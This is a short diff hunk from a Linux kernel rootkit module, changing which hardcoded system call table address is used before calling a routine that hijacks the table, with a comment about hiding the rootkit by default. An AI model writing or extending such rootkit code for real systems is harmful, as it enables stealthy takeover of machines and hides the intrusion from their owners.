@@ -139,9 +139,9 @@ int init_module(void){
 	 */
 
 	//Edwin's syscall table address: 
-	sys_call_table = (unsigned long*)0xc1688140;
+	//sys_call_table = (unsigned long*)0xc1688140;
 	
-	//sys_call_table = (unsigned long*)0xc15c3060;
+	sys_call_table = (unsigned long*)0xc15c3060;
 	
 	hijack_sys_call_table();
 	//hide our rootkit by default
